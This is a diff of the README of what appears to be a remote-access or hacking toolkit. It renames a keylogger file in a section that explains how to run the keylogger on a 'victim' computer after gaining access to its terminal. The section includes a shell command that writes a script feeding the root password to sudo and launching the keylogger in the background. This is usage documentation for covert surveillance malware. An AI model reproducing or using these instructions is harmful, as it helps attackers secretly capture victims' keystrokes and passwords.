@@ -73,11 +73,11 @@ Exctracts an archive.
 
 Keylogger
 ---------------
-Before one can start to use the keylogger, the victim must have the keylogger.py file downloaded somewhere on its computer. This is most easily done via the file transfer explained in the section below. 
+Before one can start to use the keylogger, the victim must have the logger.py file downloaded somewhere on its computer. This is most easily done via the file transfer explained in the section below. 
 
-Once a connection is established, acces to the victim's terminal is acquired and keylogger.py is available, one can follow the code below in the same order to use the keylogger.
+Once a connection is established, acces to the victim's terminal is acquired and logger.py is available, one can follow the code below in the same order to use the keylogger.
 
-echo -e '#!/bin/sh\n echo [root password] | sudo -S python3 keylogger.py x & > logger.sh
+echo -e '#!/bin/sh\n echo [root password] | sudo -S python3 logger.py x & > logger.sh
 A .sh file will be created in the same directory with this code.
 The x must be replaced with a number after the amount of characters typed must be stored, usually this is x = 10.
 
